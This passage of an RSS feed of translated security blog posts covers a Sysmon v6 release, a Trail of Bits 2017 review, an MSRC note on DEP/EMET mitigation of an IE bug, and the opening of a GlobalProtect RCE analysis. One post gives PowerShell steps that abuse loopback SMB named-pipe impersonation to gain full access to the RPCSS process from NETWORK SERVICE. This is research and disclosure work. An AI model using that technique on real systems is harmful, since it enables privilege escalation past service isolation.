我们很高兴宣布@markrussinovich和@mxatone已发布Sysmon v6版本。两年前首次讨论Sysmon v2时仅支持7种事件类型，如今已扩展至19种事件类型外加错误事件。从Mark在RSA大会的演示中可以看到新增的3种v6事件类型（已高亮显示）。&lt;/p&gt;
&lt;h2 id=&#34;sysmon事件类型&#34;&gt;Sysmon事件类型
&lt;/h2&gt;&lt;p&gt;&amp;ldquo;本次发布的Sysmon作为后台监控工具，可将系统活动记录到事件日志中用于安全事件检测和取证。新版本新增了事件模式显示选项、配置变更事件记录、标准化注册表路径显示，以及命名管道创建和连接事件监控功能。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;Mark的演示包含了Sysmon优化运行的基础事件推荐配置：&lt;/p&gt;
&lt;h3 id=&#34;基础事件推荐配置&#34;&gt;基础事件推荐配置
&lt;/h3&gt;&lt;p&gt;（图表内容：进程创建/终止、网络连接、文件创建时间变更等核心监控项）&lt;/p&gt;
&lt;h3 id=&#34;基础事件推荐配置续&#34;&gt;基础事件推荐配置（续）
&lt;/h3&gt;&lt;p&gt;（图表内容：WMI事件、驱动程序加载、跨进程注入等高级监控项）&lt;/p&gt;
&lt;p&gt;强烈建议采用这些推荐配置进行部署。初学者可使用Sysmon配置模板快速上手，如@SwiftOnSecurity在Github提供的sysmon-config-export.xml。该模板特点包括：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;每行配置均有详细注释&lt;/li&gt;
&lt;li&gt;按功能分区并附带解释说明&lt;/li&gt;
&lt;li&gt;兼具Sysmon教学指南功能&lt;/li&gt;
&lt;li&gt;涵盖Windows系统关键监控区域&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;部署命令示例：&lt;br&gt;
&lt;code&gt;sysmon.exe -accepteula -i sysmonconfig-export.xml&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;实战演示驱动加载检测&#34;&gt;实战演示：驱动加载检测
&lt;/h2&gt;&lt;p&gt;通过WinPMEM内存取证工具加载内核驱动时，Sysmon准确捕获了Event ID 6（驱动加载）事件：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;WinPMEM执行命令：
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;winpmem_2.1.post4.exe -l -d winpmem.sys
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Windows事件查看器对应日志：&lt;br&gt;
&lt;code&gt;Applications and Services Logs/Microsoft/Windows/Sysmon/Operational&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;最后附上Mark提出的Sysmon最佳实践要点：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;全环境部署（包括工作站和服务器）&lt;/li&gt;
&lt;li&gt;结合威胁情报优化配置&lt;/li&gt;
&lt;li&gt;建立事件响应流程&lt;/li&gt;
&lt;li&gt;集中化日志收集与分析&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;立即部署Sysmon v6，全面提升您的安全监控能力！&lt;/p&gt;
</description>
        </item>
        <item>
        <title>2017年度回顾：自动化漏洞挖掘、符号执行与区块链安全的技术突破</title>
        <link>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</link>
        <pubDate>Sat, 02 Aug 2025 03:22:11 +0800</pubDate>
        
        <guid>http://localhost:1313/p/2017%E5%B9%B4%E5%BA%A6%E5%9B%9E%E9%A1%BE%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E5%AE%89%E5%85%A8%E7%9A%84%E6%8A%80%E6%9C%AF%E7%AA%81%E7%A0%B4/</guid>
        <description>&lt;h1 id=&#34;2017年度回顾---trail-of-bits博客&#34;&gt;2017年度回顾 - Trail of Bits博客
&lt;/h1&gt;&lt;p&gt;2017年是技术突破的一年！我们在自动化漏洞发现、符号执行和二进制翻译等领域发布了创新研究，并改进了安全研究人员依赖的基础工具。我们在智能合约安全领域扩大影响力，成为顶尖的区块链安全公司。&lt;/p&gt;
&lt;h2 id=&#34;创新研究&#34;&gt;创新研究
&lt;/h2&gt;&lt;h3 id=&#34;自动化漏洞发现进入现实世界&#34;&gt;自动化漏洞发现进入现实世界
&lt;/h3&gt;&lt;p&gt;2017年该领域发展迅猛。我们与洛克希德·马丁和国防部DIUx签订合同，应用我们的网络推理系统(Cyber Reasoning System)。同时我们将CGC挑战二进制文件移植到Windows、macOS和Linux平台，为工具评估提供客观基准。&lt;/p&gt;
&lt;h3 id=&#34;manticore提升符号执行工具可用性&#34;&gt;Manticore提升符号执行工具可用性
&lt;/h3&gt;&lt;p&gt;我们开源了高度灵活的符号执行工具Manticore，它已成为DARPA LADS项目的重要组成部分。我们将其应用于以太坊虚拟机(EVM)字节码分析，可自动发现合约函数、生成触发合约状态的交易并检查失败状态。&lt;/p&gt;
&lt;h3 id=&#34;mcsema-20实现二进制文件近似源代码处理&#34;&gt;McSema 2.0实现二进制文件近似源代码处理
&lt;/h3&gt;&lt;p&gt;我们对二进制翻译工具McSema进行了重大升级：代码清理、性能提升，并分离指令语义与控制流恢复创建Remill库。演示用例包括二进制补丁修改、与KLEE的符号执行，以及重用基于LLVM的工具(如libFuzzer)。&lt;/p&gt;
&lt;h2 id=&#34;基础工具&#34;&gt;基础工具
&lt;/h2&gt;&lt;h3 id=&#34;巩固以太坊基础设施&#34;&gt;巩固以太坊基础设施
&lt;/h3&gt;&lt;p&gt;我们开发了行业领先的智能合约安全工具套件，包括适配Manticore用于以太坊安全审计。我们加入了企业以太坊联盟(EEA)，并公开了RSK和DappHub Sai的安全审计报告。&lt;/p&gt;
&lt;h3 id=&#34;osquery扩展功能边界&#34;&gt;osquery扩展功能边界
&lt;/h3&gt;&lt;p&gt;我们在2016年将Facebook的开源终端监控代理移植到Windows后，继续增强osquery框架：重新设计基于auditd的文件完整性监控，添加CCleaner恶意软件检测功能，并创建扩展仓库。&lt;/p&gt;
&lt;h3 id=&#34;iverify满足iphone用户基本需求&#34;&gt;iVerify满足iPhone用户基本需求
&lt;/h3&gt;&lt;p&gt;我们发布了包含最全面iOS越狱检测的iVerify库，可检测iOS 10和11的越狱状态，并承诺随iOS更新持续维护。&lt;/p&gt;
&lt;h3 id=&#34;algo普及自托管vpn服务&#34;&gt;Algo普及自托管VPN服务
&lt;/h3&gt;&lt;p&gt;我们2016年发布的自托管个人VPN服务器Algo在2017年获得广泛关注。它采用现代协议和密码，包含最小化软件集，并得到70名Github贡献者的704次提交。&lt;/p&gt;
&lt;h2 id=&#34;学习与分享&#34;&gt;学习与分享
&lt;/h2&gt;&lt;h3 id=&#34;推动漏洞缓解措施部署&#34;&gt;推动漏洞缓解措施部署
&lt;/h3&gt;&lt;p&gt;我们比较了clang的CFI与Visual Studio的CFG实现，创建了Windows Defender的&amp;quot;Flying Sandbox Monster&amp;quot;——首个Windows平台沙盒化反病毒扫描器，使用Rust框架在AppContainers中隔离不可信应用。&lt;/p&gt;
&lt;h3 id=&#34;聚焦binary-ninja&#34;&gt;聚焦Binary Ninja
&lt;/h3&gt;&lt;p&gt;我们通过多种方式展示Vector35逆向平台的能力：解释其低级中间语言(LLIL)基础、演示如何开发平台无关工具、分享DEF CON CTF挑战分析模块。&lt;/p&gt;
&lt;h3 id=&#34;支持重要事业&#34;&gt;支持重要事业
&lt;/h3&gt;&lt;p&gt;我们赞助UIUC CTF等竞赛，支持GreHack等会议，并赞助Risky Business播客分享安全洞见。&lt;/p&gt;
&lt;h2 id=&#34;2018年展望&#34;&gt;2018年展望
&lt;/h2&gt;&lt;p&gt;我们将继续推进国防部DIUx的Voltron项目、深化区块链安全研究、增强开源项目支持(osquery、Google Santa等)、发布iVerify独立版、优化Algo的易用性，并通过DeepState等工具使先进技术更易获取。&lt;/p&gt;
&lt;hr&gt;
</description>
        </item>
        <item>
        <title>Windows登录会话共享漏洞：突破服务加固隔离的技术分析</title>
        <link>http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 02:55:08 +0800</pubDate>
        
        <guid>http://localhost:1313/p/windows%E7%99%BB%E5%BD%95%E4%BC%9A%E8%AF%9D%E5%85%B1%E4%BA%AB%E6%BC%8F%E6%B4%9E%E7%AA%81%E7%A0%B4%E6%9C%8D%E5%8A%A1%E5%8A%A0%E5%9B%BA%E9%9A%94%E7%A6%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/</guid>
        <description>&lt;h3 id=&#34;windows登录会话的过度共享&#34;&gt;Windows登录会话的过度共享
&lt;/h3&gt;&lt;p&gt;Windows的登录会话通常与单个经过身份验证的用户及其令牌绑定。然而对于服务账户而言情况并非如此——在服务加固机制下，同一个登录会话中可能存在多个带有不同服务组的令牌。本文将展示这种共享机制如何破坏服务加固的隔离性（至少对NETWORK SERVICE账户有效），并再次强调S-1-1-0并非安全边界。&lt;/p&gt;
&lt;h4 id=&#34;技术核心lsass令牌缓存机制&#34;&gt;技术核心：LSASS令牌缓存机制
&lt;/h4&gt;&lt;p&gt;当LSASS为新登录会话创建令牌时，会存储该令牌以供后续检索。虽然大多数场景下这个机制无显著作用，但在网络认证时会被重新启用。观察&lt;code&gt;AcquireCredentialsHandle&lt;/code&gt;API的原型时会发现&lt;code&gt;pvLogonID&lt;/code&gt;参数，其说明指出：&lt;/p&gt;
&lt;p&gt;&amp;ldquo;指向标识用户的本地唯一标识符(LUID)。此参数为文件系统进程（如网络重定向器）提供。该参数可为NULL。&amp;rdquo;&lt;/p&gt;
&lt;p&gt;拥有TCB权限时，此参数可指定用于网络认证的登录会话ID（从令牌视角看即认证ID）。虽然常规网络认证中令牌无法跨机器跟随，但在&lt;strong&gt;本地环回认证&lt;/strong&gt;场景下，服务端协商获得的令牌将是会话令牌而非调用方令牌。&lt;/p&gt;
&lt;h4 id=&#34;利用smb实现权限提升&#34;&gt;利用SMB实现权限提升
&lt;/h4&gt;&lt;p&gt;关键线索在于说明中的&amp;quot;网络重定向器&amp;quot;。最易访问且支持本地环回认证的重定向器是什么？&lt;strong&gt;SMB协议&lt;/strong&gt;。它是否提供获取网络认证令牌的原语？&lt;strong&gt;命名管道&lt;/strong&gt;。SMB是否以内核模式进行网络认证从而具备TCB特权？确实如此。&lt;/p&gt;
&lt;h4 id=&#34;漏洞复现windows-10-1909环境&#34;&gt;漏洞复现（Windows 10 1909环境）
&lt;/h4&gt;&lt;ol&gt;
&lt;li&gt;首先需要NETWORK SERVICE权限的PowerShell进程（可通过作者前文方法实现）&lt;/li&gt;
&lt;li&gt;创建命名管道并监听连接：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;New-NtNamedPipeFile&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\.\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Win32Path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Start-Job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Listen&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;通过本地主机访问管道：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$file&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Get-NtFile&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;localhost&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ABC&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Win32Path&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;Wait-Job&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$job&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Out-Null&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;在模拟命名管道时打开RPCSS进程：
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$p&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Use-NtObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Impersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Get-NtProcess&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-ProcessId&lt;/span&gt; &lt;span class=&#34;mf&#34;&gt;1152&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;此时获得的访问权限为&lt;code&gt;AllAccess&lt;/code&gt;，因为LSASS存储的是该登录会话中首个令牌（即RPCSS进程的令牌）。&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;技术验证&#34;&gt;技术验证
&lt;/h4&gt;&lt;p&gt;检查模拟令牌的组列表可确认该令牌属于RPCSS服务：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nb&#34;&gt;Use-NtObject&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$pipe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Impersonate&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;())&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nb&#34;&gt;Get-NtToken&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;-Impersonation&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$token&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;py&#34;&gt;Groups&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;?&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Name&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;-Match&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;Rpcss&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;输出显示&lt;code&gt;NT SERVICE\RpcSs&lt;/code&gt;组的存在，证实了令牌来源。&lt;/p&gt;
&lt;h4 id=&#34;影响范围&#34;&gt;影响范围
&lt;/h4&gt;&lt;p&gt;此特性存在于所有登录会话，但普通用户会话的利用价值较低。需注意的是：当以NETWORK SERVICE身份访问管理共享时，实际会以RPCSS服务身份认证，可能访问该服务SID创建的文件。本文仅抛砖引玉，相信读者能发掘更多创造性利用方式。&lt;/p&gt;
</description>
        </item>
        <item>
        <title>DEP与EMET防护最新IE漏洞攻击的技术解析</title>
        <link>http://localhost:1313/p/dep%E4%B8%8Eemet%E9%98%B2%E6%8A%A4%E6%9C%80%E6%96%B0ie%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</link>
        <pubDate>Sat, 02 Aug 2025 02:33:23 +0800</pubDate>
        
        <guid>http://localhost:1313/p/dep%E4%B8%8Eemet%E9%98%B2%E6%8A%A4%E6%9C%80%E6%96%B0ie%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E7%9A%84%E6%8A%80%E6%9C%AF%E8%A7%A3%E6%9E%90/</guid>
        <description>&lt;p&gt;今天我们发布了安全公告2458511，通报了利用Internet Explorer漏洞的有限攻击事件。IE9测试版不受影响，而IE6、7、8存在风险。目前发现的攻击仅针对Windows XP系统上的IE6和7版本，IE8用户不会受到成功攻击。本文将解析漏洞原理、说明IE8风险降低的原因，并提供防护建议。&lt;/p&gt;
&lt;h3 id=&#34;漏洞原理&#34;&gt;漏洞原理
&lt;/h3&gt;&lt;p&gt;IE在解析HTML时对特定CSS标签组合的内存分配不足，可能导致虚表指针最低有效字节被覆盖。攻击者通过特定模式的内存喷射（heap spray）可能实现代码执行。数据执行保护（DEP）正是防御此类堆喷射攻击的有效手段。&lt;/p&gt;
&lt;h3 id=&#34;dep的防护作用&#34;&gt;DEP的防护作用
&lt;/h3&gt;&lt;p&gt;当前所有攻击均被DEP阻断。IE8默认启用DEP，早期版本也可手动开启（详见公告）。由于该漏洞非典型释放后使用（use-after-free）类型，攻击者难以绕过DEP防护。现有DEP绕过技术无法直接应用，因为内存破坏属于部分虚表指针覆盖。我们预计任何绕过DEP的利用尝试都将极不稳定（导致IE崩溃），特别是在支持地址空间布局随机化（ASLR）的系统上。&lt;/p&gt;
&lt;h3 id=&#34;增强防护措施&#34;&gt;增强防护措施
&lt;/h3&gt;&lt;p&gt;除启用DEP外，最佳解决方案是通过用户自定义CSS文件覆盖网站提供的CSS样式。该方法能阻止所有IE版本进入漏洞代码路径，且应用兼容性风险极低。公告中详细描述了在HKEY_CURRENT_USER注册表项中配置用户CSS的方法。&lt;/p&gt;
&lt;h3 id=&#34;emet的进阶防护&#34;&gt;EMET的进阶防护
&lt;/h3&gt;&lt;p&gt;今年发布的EMET 2.0工具集通过多种安全缓解技术防御漏洞利用。除强制启用DEP外，EMET还包含强制性ASLR和EAT访问过滤（EAF）等防护机制。需注意安装EMET后需单独配置应用防护（详见公告和用户手册）。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;致谢Fermin J. Serna对本问题和EMET工作的贡献。&lt;/em&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;MSRC工程团队：Andrew Roths、Jonathan Ness、Chengyun Chu&lt;/li&gt;
&lt;/ul&gt;
</description>
        </item>
        <item>
        <title>攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析，以Uber为例</title>
        <link>http://localhost:1313/p/%E6%94%BB%E5%87%BBssl-vpn%E7%B3%BB%E5%88%97%E4%B8%80palo-alto-globalprotect%E9%A2%84%E8%AE%A4%E8%AF%81rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A5uber%E4%B8%BA%E4%BE%8B/</link>
        <pubDate>Sat, 02 Aug 2025 02:11:51 +0800</pubDate>
        
        <guid>http://localhost:1313/p/%E6%94%BB%E5%87%BBssl-vpn%E7%B3%BB%E5%88%97%E4%B8%80palo-alto-globalprotect%E9%A2%84%E8%AE%A4%E8%AF%81rce%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%BB%A5uber%E4%B8%BA%E4%BE%8B/</guid>
        <description>&lt;h1 id=&#34;攻击ssl-vpn系列一palo-alto-globalprotect预认证rce漏洞分析&#34;&gt;攻击SSL VPN系列(一)：Palo Alto GlobalProtect预认证RCE漏洞分析
&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;作者&lt;/strong&gt;: Orange Tsai(@orange_8361) 和 Meh Chang(@mehqq_)&lt;/p&gt;
&lt;p&gt;SSL VPN用于保护企业资产免受互联网暴露，但如果SSL VPN本身存在漏洞会怎样？它们暴露在互联网上，被信任为保护内网入口的唯一屏障。一旦SSL VPN服务器被攻破，攻击者就能渗透内网甚至控制所有连接到该VPN的用户！基于其重要性，过去几个月我们启动了对主流SSL VPN产品安全性的研究。&lt;/p&gt;
&lt;p&gt;我们计划分三篇文章发布研究成果。本文将作为首篇，因为它是一个有趣的故事，非常适合作为我们在Black Hat USA和DEFCON演讲的开胃菜：&lt;/p&gt;
&lt;p&gt;《像NSA一样渗透企业内网 - 主流SSL VPN的预认证RCE漏洞！》&lt;/p&gt;
&lt;h2 id=&#34;漏洞详情&#34;&gt;漏洞详情
&lt;/h2&gt;&lt;p&gt;这是一个无需认证的简单格式字符串漏洞。sslmgr是处理服务器与客户端SSL握手的SSL网关，通过Nginx反向代理暴露在/sslmgr路径下。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ curl https://global-protect/sslmgr
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;lt;?xml &lt;span class=&#34;nv&#34;&gt;version&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;1.0&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;encoding&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;UTF-8&amp;#34;&lt;/span&gt; ?&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &amp;lt;clientcert-response&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;status&amp;gt;error&amp;lt;/status&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &amp;lt;msg&amp;gt;Invalid parameters&amp;lt;/msg&amp;gt;
